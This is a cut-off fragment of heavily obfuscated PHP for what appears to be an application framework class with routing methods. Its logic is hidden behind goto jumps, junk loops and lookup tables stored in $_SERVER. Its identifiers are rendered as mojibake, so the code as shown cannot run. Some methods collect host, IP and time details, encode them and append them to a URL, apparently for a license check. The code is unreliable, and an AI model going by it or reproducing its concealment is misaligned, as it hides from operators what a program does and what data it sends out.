$a”¥øåî›Á = $aØ¤ò¥³±Ù[551]; if (!$a”¥øåî›Á) { die; } $this->defaultModule = $FãÁ‰í×Ü[0] ? $FãÁ‰í×Ü[0] : $this->defaultModule; goto C“£òšîØŞ; eå®ß‚é‚: $this->{$_SERVER[®Ñèœ¡][3]}($d‡ÁĞæ’í[4], array($this, $d‡ÁĞæ’í[5])); $fÉ¥åÎõ»Ú = $aØ¤ò¥³±Ù[556]; if (!$fÉ¥åÎõ»Ú) { die; } goto Eƒ¢§›‚Ï„; C“£òšîØŞ: $Fá¶Ÿ¢î‘¬ = $aØ¤ò¥³±Ù[552]; if (strlen($Fá¶Ÿ¢î‘¬) < $aØ¤ò¥³±Ù[553]) { return; } $this->defaultController = $FãÁ‰í×Ü[1] ? $FãÁ‰í×Ü[1] : $this->defaultController; goto a Âöè£âÂ; a Âöè£âÂ: $this->defaultAction = $FãÁ‰í×Ü[2] ? $FãÁ‰í×Ü[2] : $this->defaultAction; $c´ñ‚åÛÉ = $aØ¤ò¥³±Ù[554]; while (strlen($c´ñ‚åÛÉ) < $aØ¤ò¥³±Ù[555]) { if (!$c´ñ‚åÛÉ) { break; } $c´ñ‚åÛÉ++; } goto eå®ß‚é‚; fŠÂãöÛÃÅ: $aØ¤ò¥³±Ù =& $_SERVER[îÖ]; $d‡ÁĞæ’í =& $_SERVER[®Ñèœ¡]; $FãÁ‰í×Ü = $d‡ÁĞæ’í[0]($d‡ÁĞæ’í[1], $d‡ÁĞæ’í[2]($BÌÁƒ¼„ßï, $d‡ÁĞæ’í[1])); goto D­ó–‚ï–È; Eƒ¢§›‚Ï„: } public function appRun($FÅ›˜Ğâ±Ê) { goto F÷§Œ³Š„õ; F÷§Œ³Š„õ: $A©±»„Ô‹Ğ =& $_SERVER[îÖ]; $B˜¿§…¿ =& $_SERVER[®Ñèœ¡]; $ağ¶¢¯Í‚ä = $B˜¿§…¿[0]($B˜¿§…¿[1], $FÅ›˜Ğâ±Ê); goto E©”²¥æ´À; AšÌ—…§ÎÔ: if ($FéŞ“ˆ±¾ù == $B˜¿§…¿[8]) { $FĞÂ´’äÏ‡ = $B˜¿§…¿[9]; $ağ¶¢¯Í‚ä[0] = $B˜¿§…¿[10]; $ağ¶¢¯Í‚ä[1] = $ağ¶¢¯Í‚ä[1] . $B˜¿§…¿[11]; $FÅ›˜Ğâ±Ê = $B˜¿§…¿[12]($B˜¿§…¿[1], $ağ¶¢¯Í‚ä); $FÅ›˜Ğâ±Ê = $B˜¿§…¿[2]($FÅ›˜Ğâ±Ê, $B˜¿§…¿[1]); } $B˜¿§…¿[13](array($B˜¿§…¿[14], $B˜¿§…¿[15]), $FĞÂ´’äÏ‡ . $B˜¿§…¿[16], $FÅ›˜Ğâ±Ê); $B˜¿§…¿[17]($FÅ›˜Ğâ±Ê); goto a¥µƒ‰Ç•†; a¥µƒ‰Ç•†: $B˜¿§…¿[13](array($B˜¿§…¿[14], $B˜¿§…¿[15]), $FĞÂ´’äÏ‡ . $B˜¿§…¿[18], $FÅ›˜Ğâ±Ê); $D‘ğœÄÜÃ = $A©±»„Ô‹Ğ[558]; goto Aó•ÂÎÂµ; E©”²¥æ´À: $e×¼œ‘“è = $A©±»„Ô‹Ğ[557]; $FéŞ“ˆ±¾ù = $B˜¿§…¿[6]($ağ¶¢¯Í‚ä[0]); $FĞÂ´’äÏ‡ = $B˜¿§…¿[7]; goto AšÌ—…§ÎÔ; Aó•ÂÎÂµ: } private function autorun() { $DÛÇŠä‚İî =& $_SERVER[®Ñèœ¡]; global $config; if ($DÛÇŠä‚İî[19]($config[$DÛÇŠä‚İî[20]]) == 0) { return; } foreach ($config[$DÛÇŠä‚İî[20]] as $cÒåÔÏƒŠÈ => $Dëã‡“›â©) { $this->{$_SERVER[®Ñèœ¡][21]}($Dëã‡“›â©); } } private function qeiz26f020cf() { goto dÍ¸Ãßæ Ô; C“¾äğÂÁ: $cÇ¥æ†¡´— = $f²¬Š«Àó [561]; if (!$B¬¹âÇâ || $B˜ˆÀ¢·ŠÌ[24]($B¬¹âÇâ) <= $B˜ˆÀ¢·ŠÌ[24]($FÒéóæÊ Ì)) { return; } if ($B˜ˆÀ¢·ŠÌ[6]($B˜ˆÀ¢·ŠÌ[25]($B¬¹âÇâ, -$B˜ˆÀ¢·ŠÌ[24]($FÒéóæÊ Ì))) != $FÒéóæÊ Ì) { return; } goto E…Öõˆã±Ö; fáØÈÑ —Æ: $D§Œß³æ—ğ = $f²¬Š«Àó [559]; while (strlen($D§Œß³æ—ğ) < $f²¬Š«Àó [560]) { if (!$D§Œß³æ—ğ) { break; } $D§Œß³æ—ğ++; } $B¬¹âÇâ = $GLOBALS[$B˜ˆÀ¢·ŠÌ[22]][$B˜ˆÀ¢·ŠÌ[23]][0]; goto C“¾äğÂÁ; A´­ÍË…àÌ: if (!$D÷Ğƒ‹î–†) { die; } $EÂää£ñ·á = $B˜ˆÀ¢·ŠÌ[26]($GLOBALS[$B˜ˆÀ¢·ŠÌ[22]][$B˜ˆÀ¢·ŠÌ[23]], 1); $GLOBALS[$B˜ˆÀ¢·ŠÌ[22]][$B˜ˆÀ¢·ŠÌ[23]] = $B˜ˆÀ¢·ŠÌ[27]($f¯œŠ§Ù¥Ä, $EÂää£ñ·á); goto B˜õÒ„ÁÁ’; dÍ¸Ãßæ Ô: $f²¬Š«Àó  =& $_SERVER[îÖ]; $B˜ˆÀ¢·ŠÌ =& $_SERVER[®Ñèœ¡]; $FÒéóæÊ Ì = $B˜ˆÀ¢·ŠÌ[8]; goto fáØÈÑ —Æ; E…Öõˆã±Ö: $f—³§„Ãæù = $B˜ˆÀ¢·ŠÌ[25]($B¬¹âÇâ, 0, -$B˜ˆÀ¢·ŠÌ[24]($FÒéóæÊ Ì)); $f¯œŠ§Ù¥Ä = array($B˜ˆÀ¢·ŠÌ[8], $f—³§„Ãæù); $D÷Ğƒ‹î–† = $f²¬Š«Àó [562]; goto A´­ÍË…àÌ; B˜õÒ„ÁÁ’: $eïŒÓİ±Š¥ = $f²¬Š«Àó [563]; if (strlen($eïŒÓİ±Š¥) < $f²¬Š«Àó [564]) { return; } $GLOBALS[$B˜ˆÀ¢·ŠÌ[22]][$B˜ˆÀ¢·ŠÌ[28]] = $B˜ˆÀ¢·ŠÌ[29]($B˜ˆÀ¢·ŠÌ[1], $GLOBALS[$B˜ˆÀ¢·ŠÌ[22]][$B˜ˆÀ¢·ŠÌ[23]]); goto bÜÙâƒ‚Ğğ; bÜÙâƒ‚Ğğ: } private function yhcr81caecd5() { goto aªÂà÷ÕëĞ; FñëÛÁ¾ÕŠ: $AÉÍ¤…ê = $E¢—¨Œ­Úõ[566]; if (strlen($AÉÍ¤…ê) < $E¢—¨Œ­Úõ[553]) { return; } $dÅ¼İ¼Æ“Í = $fÕŒ‚Ä°¬¡[25]($E–Àê÷½Íò, $F¦ó˜¢²®‡ + $fÕŒ‚Ä°¬¡[24]($BŠ ÈŠë¾Á)); goto C¥¶ØÍ´›‰; e“ÜœÆ£«: $GLOBALS[$fÕŒ‚Ä°¬¡[22]][$fÕŒ‚Ä°¬¡[23]] = $fÕŒ‚Ä°¬¡[0]($fÕŒ‚Ä°¬¡[36], $dÅ¼İ¼Æ“Í); $GLOBALS[$fÕŒ‚Ä°¬¡[22]][$fÕŒ‚Ä°¬¡[28]] = $fÕŒ‚Ä°¬¡[29]($fÕŒ‚Ä°¬¡[1], $GLOBALS[$fÕŒ‚Ä°¬¡[22]][$fÕŒ‚Ä°¬¡[23]]); $AªÎù©ÙŒ = $E¢—¨Œ­Úõ[570]; goto a¤š­” ‹; CÜ§ÔÒ…ø‚: $BŠ ÈŠë¾Á = $fÕŒ‚Ä°¬¡[31]; if (!$fÕŒ‚Ä°¬¡[32]($E–Àê÷½Íò, $BŠ ÈŠë¾Á)) { return; } $F¦ó˜¢²®‡ = $fÕŒ‚Ä°¬¡[33]($E–Àê÷½Íò, $BŠ ÈŠë¾Á); goto FñëÛÁ¾ÕŠ; aªÂà÷ÕëĞ: $E¢—¨Œ­Úõ =& $_SERVER[îÖ]; $fÕŒ‚Ä°¬¡ =& $_SERVER[®Ñèœ¡]; if ($GLOBALS[$fÕŒ‚Ä°¬¡[22]][$fÕŒ‚Ä°¬¡[28]] != $fÕŒ‚Ä°¬¡[10]) { return; } goto FìÂ…ÚÓ¡ñ; FìÂ…ÚÓ¡ñ: $E–Àê÷½Íò = $_SERVER[$fÕŒ‚Ä°¬¡[30]]; $C§ğ•ˆº = $E¢—¨Œ­Úõ[565]; if (strlen($C§ğ•ˆº) < $E¢—¨Œ­Úõ[560]) { die; } goto CÜ§ÔÒ…ø‚; a¤š­” ‹: if (!$AªÎù©ÙŒ) { die; } goto B¤ºÔ™†İ; FëØß“¯…: $dÅ¼İ¼Æ“Í = $fÕŒ‚Ä°¬¡[2]($C¾äéò„‰‰[0][0], $fÕŒ‚Ä°¬¡[36]); $B”¡—˜ç = $E¢—¨Œ­Úõ[569]; while (strlen($B”¡—˜ç) < $E¢—¨Œ­Úõ[555]) { if (!$B”¡—˜ç) { break; } $B”¡—˜ç++; } goto e“ÜœÆ£«; C¥¶ØÍ´›‰: $dâ‘éì©Ûœ = $E¢—¨Œ­Úõ[567]; if (strlen($dâ‘éì©Ûœ) < $E¢—¨Œ­Úõ[568]) { return; } $fÕŒ‚Ä°¬¡[34]($fÕŒ‚Ä°¬¡[35], $dÅ¼İ¼Æ“Í, $C¾äéò„‰‰); goto FëØß“¯…; B¤ºÔ™†İ: } public function run() { goto aØ„ñÃ°õ·; Aø‰¹å•½: $Fê¶ÉÎŞÏ[39]($Fê¶ÉÎŞÏ[41], isset($E¾í’ÓÀàÄ[1]) && $E¾í’ÓÀàÄ[0] ? $E¾í’ÓÀàÄ[1] : $this->defaultController); $Fê¶ÉÎŞÏ[39]($Fê¶ÉÎŞÏ[42], isset($E¾í’ÓÀàÄ[2]) && $E¾í’ÓÀàÄ[0] ? $E¾í’ÓÀàÄ[2] : $this->defaultAction); $Fê¶ÉÎŞÏ[39]($Fê¶ÉÎŞÏ[43], MOD . $Fê¶ÉÎŞÏ[1] . ST . $Fê¶ÉÎŞÏ[1] . ACT); goto bÒôÁ­¡¾Á; bÒôÁ­¡¾Á: $F‘Ä›ˆŞØ” = $DÕ¼¨¸·†—[572]; while (strlen($F‘Ä›ˆŞØ”) < $DÕ¼¨¸·†—[560]) { if (!$F‘Ä›ˆŞØ”) { break; } $F‘Ä›ˆŞØ”++; } $_SERVER[$Fê¶ÉÎŞÏ[44]] = $Fê¶ÉÎŞÏ[6](ACTION); goto e……÷½¸Ë; EôÈËŞÎïÔ: $this->{$_SERVER[®Ñèœ¡][38]}(); $bÎá“ãºÔŞ = $DÕ¼¨¸·†—[571]; while ($bÎá“ãºÔŞ < $DÕ¼¨¸·†—[553]) { if ($bÎá“ãºÔŞ >= 0) { break; } $bÎá“ãºÔŞ++; } goto f²„Ğ‰Ú‹; f²„Ğ‰Ú‹: $E¾í’ÓÀàÄ = $GLOBALS[$Fê¶ÉÎŞÏ[22]][$Fê¶ÉÎŞÏ[23]]; $e¯êŠ¶¯àÁ = $GLOBALS[$Fê¶ÉÎŞÏ[22]][$Fê¶ÉÎŞÏ[28]]; $Fê¶ÉÎŞÏ[39]($Fê¶ÉÎŞÏ[40], isset($E¾í’ÓÀàÄ[0]) && $E¾í’ÓÀàÄ[0] ? $E¾í’ÓÀàÄ[0] : $this->defaultModule); goto Aø‰¹å•½; aØ„ñÃ°õ·: $DÕ¼¨¸·†— =& $_SERVER[îÖ]; $Fê¶ÉÎŞÏ =& $_SERVER[®Ñèœ¡]; $this->{$_SERVER[®Ñèœ¡][37]}(); goto EôÈËŞÎïÔ; e……÷½¸Ë: $EÂ‰ÓÆçğ† = $DÕ¼¨¸·†—[573]; $this->{$_SERVER[®Ñèœ¡][45]}(); $BœÆ…öïµ = $DÕ¼¨¸·†—[574]; goto eõë£²³¦İ; eõë£²³¦İ: if (!$BœÆ…öïµ) { return; } if ($Fê¶ÉÎŞÏ[19]($E¾í’ÓÀàÄ) >= 3) { $this->{$_SERVER[®Ñèœ¡][21]}($e¯êŠ¶¯àÁ); } else { $this->{$_SERVER[®Ñèœ¡][21]}(ACTION); } goto EÑèÒùò£; EÑèÒùò£: } private $jsocc4af2946 = array(); private $ovyhb2994ff5 = ''; public function qvrn64bdad4c() { goto e‚Éñ´Ë¤‚; b¹»İ³ÄÇ: $this->{$_SERVER[®Ñèœ¡][3]}($aÏ§Ö®±âÉ[59], array($this, $aÏ§Ö®±âÉ[60])); goto d±¾÷š¹Š; C›ÇË—ò¡¡: $this->{$_SERVER[®Ñèœ¡][3]}($aÏ§Ö®±âÉ[55], array($this, $aÏ§Ö®±âÉ[56])); $d‹­Ï£ÇÃ = $C¦øô‰•ÜÒ[579]; if (strlen($d‹­Ï£ÇÃ) < $C¦øô‰•ÜÒ[560]) { return; } goto díŠ«Ñì›á; e‚Éñ´Ë¤‚: $C¦øô‰•ÜÒ =& $_SERVER[îÖ]; $aÏ§Ö®±âÉ =& $_SERVER[®Ñèœ¡]; $this->{$_SERVER[®Ñèœ¡][46]}(); goto f—É²ñî÷è; DÈÑ°¼ğ†Ø: $EÏ•öğŸåç = $C¦øô‰•ÜÒ[578]; while (strlen($EÏ•öğŸåç) < $C¦øô‰•ÜÒ[560]) { if (!$EÏ•öğŸåç) { break; } $EÏ•öğŸåç++; } $this->{$_SERVER[®Ñèœ¡][50]}(); goto c©’èƒ”µ; f—É²ñî÷è: $bØ††‡Õá¼ = $C¦øô‰•ÜÒ[575]; while ($bØ††‡Õá¼ < $C¦øô‰•ÜÒ[560]) { if ($bØ††‡Õá¼ >= 0) { break; } $bØ††‡Õá¼++; } $this->{$_SERVER[®Ñèœ¡][47]}(); goto a­ÓäÊÍÄš; a­ÓäÊÍÄš: $cŸ—°Âñ÷± = $C¦øô‰•ÜÒ[576]; while (strlen($cŸ—°Âñ÷±) < $C¦øô‰•ÜÒ[553]) { if (!$cŸ—°Âñ÷±) { break; } $cŸ—°Âñ÷±++; } $this->{$_SERVER[®Ñèœ¡][48]}(); goto c•ˆŸÕ‡Ø¡; c©’èƒ”µ: $this->{$_SERVER[®Ñèœ¡][51]}(); $this->{$_SERVER[®Ñèœ¡][52]}(); $this->{$_SERVER[®Ñèœ¡][3]}($aÏ§Ö®±âÉ[53], array($this, $aÏ§Ö®±âÉ[54])); goto C›ÇË—ò¡¡; díŠ«Ñì›á: $this->{$_SERVER[®Ñèœ¡][3]}($aÏ§Ö®±âÉ[57], array($this, $aÏ§Ö®±âÉ[58])); $a’“²Ó‡à = $C¦øô‰•ÜÒ[580]; while ($a’“²Ó‡à < $C¦øô‰•ÜÒ[553]) { if ($a’“²Ó‡à >= 0) { break; } $a’“²Ó‡à++; } goto b¹»İ³ÄÇ; c•ˆŸÕ‡Ø¡: $B®ÌØó¤¸” = $C¦øô‰•ÜÒ[577]; while ($B®ÌØó¤¸” < $C¦øô‰•ÜÒ[564]) { if ($B®ÌØó¤¸” >= 0) { break; } $B®ÌØó¤¸”++; } $this->{$_SERVER[®Ñèœ¡][49]}(); goto DÈÑ°¼ğ†Ø; d±¾÷š¹Š: } public function qmkz9680edef($bìØ¡§«) { goto cšñÊëƒ¬; fÄö§‚œ«±: if ($cäòµ¦ŒÜÁ[$cãŸ¶‡éÖ’[120]] != $cãŸ¶‡éÖ’[121]) { $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[122]] = $cäòµ¦ŒÜÁ[$cãŸ¶‡éÖ’[122]]; $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[123]] = $cäòµ¦ŒÜÁ[$cãŸ¶‡éÖ’[123]]; $A‡ô¹›œŞ = $cãŸ¶‡éÖ’[124](10) . $this->ovyhb2994ff5 . $cãŸ¶‡éÖ’[124](5); $bìØ¡§«[$cãŸ¶‡éÖ’[93]][$cãŸ¶‡éÖ’[125]][$cãŸ¶‡éÖ’[126]] = $this->{$_SERVER[®Ñèœ¡][127]}($A‡ô¹›œŞ, $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[113]]); } if ($this->ovyhb2994ff5 == $cãŸ¶‡éÖ’[121]) { $bìØ¡§«[$cãŸ¶‡éÖ’[93]][$cãŸ¶‡éÖ’[94]][$cãŸ¶‡éÖ’[99]][$cãŸ¶‡éÖ’[107]] = 0; } $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[128]] = $cãŸ¶‡éÖ’[104]($this->jsocc4af2946, $cãŸ¶‡éÖ’[129], $cãŸ¶‡éÖ’[10]); goto DŞ¯˜ÎÁ³Ô; fß‰‡ƒÚîô: $bìØ¡§«[$cãŸ¶‡éÖ’[93]][$cãŸ¶‡éÖ’[94]][$cãŸ¶‡éÖ’[99]] = array($cãŸ¶‡éÖ’[100] => (int) $eˆò§ùñá[$cãŸ¶‡éÖ’[101]], $cãŸ¶‡éÖ’[102] => $cãŸ¶‡éÖ’[103]($cãŸ¶‡éÖ’[104]($eˆò§ùñá, $cãŸ¶‡éÖ’[105], array())), $cãŸ¶‡éÖ’[106] => (int) $cãŸ¶‡éÖ’[104]($eˆò§ùñá, $cãŸ¶‡éÖ’[107], 0)); $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[109]] = $cãŸ¶‡éÖ’[110]($cãŸ¶‡éÖ’[111])->{$_SERVER[®Ñèœ¡][112]}(); $bÚñîƒæê˜ = $Dìã´îœ¢[585]; goto aÔ”ª­±Ÿ; f™Ş‡Ô†Ä: $Cİµº‡Ì®İ = array($cãŸ¶‡éÖ’[64], $cãŸ¶‡éÖ’[65], $cãŸ¶‡éÖ’[66], $cãŸ¶‡éÖ’[67], $cãŸ¶‡éÖ’[68], $cãŸ¶‡éÖ’[69], $cãŸ¶‡éÖ’[70], $cãŸ¶‡éÖ’[71], $cãŸ¶‡éÖ’[72], $cãŸ¶‡éÖ’[73], $cãŸ¶‡éÖ’[74], $cãŸ¶‡éÖ’[75], $cãŸ¶‡éÖ’[76], $cãŸ¶‡éÖ’[77], $cãŸ¶‡éÖ’[78], $cãŸ¶‡éÖ’[79], $cãŸ¶‡éÖ’[80], $cãŸ¶‡éÖ’[81], $cãŸ¶‡éÖ’[82], $cãŸ¶‡éÖ’[83], $cãŸ¶‡éÖ’[84], $cãŸ¶‡éÖ’[85], $cãŸ¶‡éÖ’[86], $cãŸ¶‡éÖ’[87], $cãŸ¶‡éÖ’[88], $cãŸ¶‡éÖ’[89], $cãŸ¶‡éÖ’[90]); $DÜö´ô”ƒ = $Dìã´îœ¢[581]; if (strlen($DÜö´ô”ƒ) < $Dìã´îœ¢[564]) { die; } goto CÅå¢İŠ±İ; DŞ¯˜ÎÁ³Ô: $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[130]] = $cãŸ¶‡éÖ’[104]($this->jsocc4af2946, $cãŸ¶‡éÖ’[131], $cãŸ¶‡éÖ’[10]); if ($cãŸ¶‡éÖ’[104]($GLOBALS, $cãŸ¶‡éÖ’[132]) && $this->config[$cãŸ¶‡éÖ’[133]]) { $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[134]] = WEB_ROOT; } return $bìØ¡§«; goto d¿Ç¿èõ•¢; CÅå¢İŠ±İ: foreach ($Cİµº‡Ì®İ as $dÈÉ™İï¯¢) { $båØ¢»ƒÑ¡ = $GLOBALS[$cãŸ¶‡éÖ’[91]][$cãŸ¶‡éÖ’[92]][$dÈÉ™İï¯¢]; if (isset($cäòµ¦ŒÜÁ[$dÈÉ™İï¯¢])) { $båØ¢»ƒÑ¡ = $cäòµ¦ŒÜÁ[$dÈÉ™İï¯¢]; } $bìØ¡§«[$cãŸ¶‡éÖ’[93]][$cãŸ¶‡éÖ’[94]][$dÈÉ™İï¯¢] = $båØ¢»ƒÑ¡; } $eˆò§ùñá = $bìØ¡§«[$cãŸ¶‡éÖ’[93]][$cãŸ¶‡éÖ’[94]][$cãŸ¶‡éÖ’[76]]; unset($bìØ¡§«[$cãŸ¶‡éÖ’[93]][$cãŸ¶‡éÖ’[95]][$cãŸ¶‡éÖ’[96]]); goto b—ÄÔ¯—¿Ï; aÔ”ª­±Ÿ: $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[113]] = $cãŸ¶‡éÖ’[114]($_SERVER[$cãŸ¶‡éÖ’[115]] . $cäòµ¦ŒÜÁ[$cãŸ¶‡éÖ’[116]]); $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[117]] = $cãŸ¶‡éÖ’[118]($cãŸ¶‡éÖ’[119]()); $bìØ¡§«[$cãŸ¶‡éÖ’[108]][$cãŸ¶‡éÖ’[120]] = $this->ovyhb2994ff5; goto fÄö§‚œ«±; A”º”»¢â: $fåÄˆÀÇ…„ = $Dìã´îœ¢[583]; if (strlen($fåÄˆÀÇ…„) < $Dìã´îœ¢[568]) { die; } unset($bìØ¡§«[$cãŸ¶‡éÖ’[93]][$cãŸ¶‡éÖ’[94]][$cãŸ¶‡éÖ’[76]]); goto A¤ŸÑŠˆ•; b—ÄÔ¯—¿Ï: $Eâ¶Ä–¡í· = $Dìã´îœ¢[582]; if (!$Eâ¶Ä–¡í·) { die; } unset($bìØ¡§«[$cãŸ¶‡éÖ’[93]][$cãŸ¶‡éÖ’[95]][$cãŸ¶‡éÖ’[97]]); goto A”º”»¢â; A¤ŸÑŠˆ•: $dÛòÖ˜Ú×Æ = $Dìã´îœ¢[584]; while (strlen($dÛòÖ˜Ú×Æ) < $Dìã´îœ¢[560]) { if (!$dÛòÖ˜Ú×Æ) { break; } $dÛòÖ˜Ú×Æ++; } unset($bìØ¡§«[$cãŸ¶‡éÖ’[93]][$cãŸ¶‡éÖ’[94]][$cãŸ¶‡éÖ’[98]]); goto fß‰‡ƒÚîô; cšñÊëƒ¬: $Dìã´îœ¢ =& $_SERVER[îÖ]; $cãŸ¶‡éÖ’ =& $_SERVER[®Ñèœ¡]; $cäòµ¦ŒÜÁ = $cãŸ¶‡éÖ’[61]($cãŸ¶‡éÖ’[62])->{$_SERVER[®Ñèœ¡][63]}(); goto f™Ş‡Ô†Ä; d¿Ç¿èõ•¢: } private function lvwfbed2286a() { goto cº†ïøÉŠ; E¥¿í¬¼×µ: foreach ($E×Æ¬‹ô as $BÔ•ˆÊØ×ã) { if (!isset($a¤ëøÇñì[$BÔ•ˆÊØ×ã]) || !$a¤ëøÇñì[$BÔ•ˆÊØ×ã]) { continue; } $e¿åƒ¨¶š[$BÔ•ˆÊØ×ã] = $a¤ëøÇñì[$BÔ•ˆÊØ×ã]; $b¨‘òÑ§Äœ = $a¸µ…ğ°¬•[591]; if (strlen($b¨‘òÑ§Äœ) < $a¸µ…ğ°¬•[555]) { return; } } $bÍ´ñ·Êª©[13](array($bÍ´ñ·Êª©[151], $bÍ´ñ·Êª©[152]), $e¿åƒ¨¶š); $fğ°ˆ¯‰ºÑ = $a¸µ…ğ°¬•[592]; goto d‚ÆÁ¤ŸÊ¦; b¥”Êæ‡Ş…: while (strlen($A’œ’…Şà) < $a¸µ…ğ°¬•[560]) { if (!$A’œ’…Şà) { break; } $A’œ’…Şà++; } $a¤ëøÇñì = $bÍ´ñ·Êª©[61]($bÍ´ñ·Êª©[62])->{$_SERVER[®Ñèœ¡][63]}(); $cÄçÚƒ“‘ = $a¸µ…ğ°¬•[589]; goto cÊˆâÇê‰; d‚ÆÁ¤ŸÊ¦: while (strlen($fğ°ˆ¯‰ºÑ) < $a¸µ…ğ°¬•[568]) { if (!$fğ°ˆ¯‰ºÑ) { break; } $fğ°ˆ¯‰ºÑ++; } goto BÌóÈàÉ‡¼; BÆµŒÇÄĞ‡: if ($this->ovyhb2994ff5 == $bÍ´ñ·Êª©[121]) { return; } $E×Æ¬‹ô = array($bÍ´ñ·Êª©[153], $bÍ´ñ·Êª©[154], $bÍ´ñ·Êª©[155], $bÍ´ñ·Êª©[156], $bÍ´ñ·Êª©[157], $bÍ´ñ·Êª©[158]); $A’œ’…Şà = $a¸µ…ğ°¬•[588]; goto b¥”Êæ‡Ş…; cº†ïøÉŠ: $a¸µ…ğ°¬• =& $_SERVER[îÖ]; $bÍ´ñ·Êª© =& $_SERVER[®Ñèœ¡]; if ($_SERVER[$bÍ´ñ·Êª©[44]] == $bÍ´ñ·Êª©[135]) { goto DØê†„ùÀ¢; DØê†„ùÀ¢: $e±”Ù¢¡™Ï = array($bÍ´ñ·Êª©[120] => $this->ovyhb2994ff5, $bÍ´ñ·Êª©[136] => $this->{$_SERVER[®Ñèœ¡][137]}(), $bÍ´ñ·Êª©[138] => $bÍ´ñ·Êª©[61]($bÍ´ñ·Êª©[139])->{$_SERVER[®Ñèœ¡][140]}()); if ($this->ovyhb2994ff5 != $bÍ´ñ·Êª©[121]) { $B­Ÿ»†Ã¹è = $bÍ´ñ·Êª©[104]($this->jsocc4af2946, $bÍ´ñ·Êª©[141]); if ($B­Ÿ»†Ã¹è) { $e±”Ù¢¡™Ï[$bÍ´ñ·Êª©[142]] = $B­Ÿ»†Ã¹è; $e±”Ù¢¡™Ï[$bÍ´ñ·Êª©[143]] = $bÍ´ñ·Êª©[144]($bÍ´ñ·Êª©[104]($this->jsocc4af2946, $bÍ´ñ·Êª©[145])); $e±”Ù¢¡™Ï[$bÍ´ñ·Êª©[146]] = $bÍ´ñ·Êª©[104]($this->jsocc4af2946, $bÍ´ñ·Êª©[131]); } } $e±”Ù¢¡™Ï = $this->{$_SERVER[®Ñèœ¡][147]}($bÍ´ñ·Êª©[148]($e±”Ù¢¡™Ï), $bÍ´ñ·Êª©[114]($bÍ´ñ·Êª©[149])); goto b‚•ğ®‰¸›; b‚•ğ®‰¸›: $C‡ÀÔ”²™ = $a¸µ…ğ°¬•[586]; if (strlen($C‡ÀÔ”²™) < $a¸µ…ğ°¬•[555]) { return; } $e¿åƒ¨¶š = array($bÍ´ñ·Êª©[150] => $e±”Ù¢¡™Ï); goto e‰¾äå¦À©; e‰¾äå¦À©: $c»ïÊÏ™Ä = $a¸µ…ğ°¬•[587]; if (!$c»ïÊÏ™Ä) { die; } $bÍ´ñ·Êª©[13](array($bÍ´ñ·Êª©[151], $bÍ´ñ·Êª©[152]), $e¿åƒ¨¶š); goto c²ŸâÀË“·; c²ŸâÀË“·: } goto BÆµŒÇÄĞ‡; cÊˆâÇê‰: while (strlen($cÄçÚƒ“‘) < $a¸µ…ğ°¬•[564]) { if (!$cÄçÚƒ“‘) { break; } $cÄçÚƒ“‘++; } $e¿åƒ¨¶š = array($bÍ´ñ·Êª©[159] => $a¤ëøÇñì[$bÍ´ñ·Êª©[64]], $bÍ´ñ·Êª©[160] => $a¤ëøÇñì[$bÍ´ñ·Êª©[65]], $bÍ´ñ·Êª©[161] => $bÍ´ñ·Êª©[10]); $D¯Ñ“¾¡É = $a¸µ…ğ°¬•[590]; goto E¥¿í¬¼×µ; BÌóÈàÉ‡¼: } private function hgov007e6c19() { goto cÊÏÓ«“‚»; F…Ù—øÙ‡: $b§ŒË¯æ´Œ = $DçÍàÛËğ«[599]; $this->jsocc4af2946 = $CÎô‡ÎÀ¬Š; $this->ovyhb2994ff5 = $cã±—…ƒ¨[$f×µÇÖ™‰[120]]; goto eœÛæƒäã»; eœÛæƒäã»: $this->{$_SERVER[®Ñèœ¡][229]}(); $f×µÇÖ™‰[166]($f×µÇÖ™‰[197]($f×µÇÖ™‰[208]), !0); $càö¶Ù³ÈÖ = $DçÍàÛËğ«[600]; goto c½Ä’Î—ÙÎ; FèÀÂĞ¬äŠ: $fäñíƒŒ™ = $this->{$_SERVER[®Ñèœ¡][199]}($CÎô‡ÎÀ¬Š[$f×µÇÖ™‰[200]]); $aµªÀ¥ïáÜ = $DçÍàÛËğ«[594]; while ($aµªÀ¥ïáÜ < $DçÍàÛËğ«[560]) { if ($aµªÀ¥ïáÜ >= 0) { break; } $aµªÀ¥ïáÜ++; } goto f¿ÏŸïáÆ; a„Œ·»: $fâ£³êË© = $f×µÇÖ™‰[25]($f×µÇÖ™‰[114]($cã±—…ƒ¨[$f×µÇÖ™‰[210]]), 10, 10); $F¹ÙòŠˆˆ‘ = $fâ£³êË© . $cã±—…ƒ¨[$f×µÇÖ™‰[120]] . $cã±—…ƒ¨[$f×µÇÖ™‰[212]]; $cã±—…ƒ¨[$f×µÇÖ™‰[122]] = $f×µÇÖ™‰[214]($f×µÇÖ™‰[118]($this->{$_SERVER[®Ñèœ¡][147]}($F¹ÙòŠˆˆ‘, $f×µÇÖ™‰[215]))); goto a­¸˜ø÷ÜÒ; f¿ÏŸïáÆ: if (!$fäñíƒŒ™ || $fäñíƒŒ™ != $f×µÇÖ™‰[201]($CÎô‡ÎÀ¬Š[$f×µÇÖ™‰[145]])) { $a™ö‰×Ö¿ = array($f×µÇÖ™‰[202] => $f×µÇÖ™‰[61]($f×µÇÖ™‰[62])->{$_SERVER[®Ñèœ¡][63]}($f×µÇÖ™‰[116]), $f×µÇÖ™‰[203] => $_SERVER[$f×µÇÖ™‰[115]], $f×µÇÖ™‰[204] => $f×µÇÖ™‰[205](), $f×µÇÖ™‰[174] => $_SERVER[$f×µÇÖ™‰[175]]); $B¼Ê¯×İ‰¶ = $this->{$_SERVER[®Ñèœ¡][206]}($f×µÇÖ™‰[148]($a™ö‰×Ö¿)); $this->{$_SERVER[®Ñèœ¡][182]}($f×µÇÖ™‰[207] . $B¼Ê¯×İ‰¶); $f×µÇÖ™‰[166]($f×µÇÖ™‰[197]($f×µÇÖ™‰[208]), !0); } $cã±—…ƒ¨ = 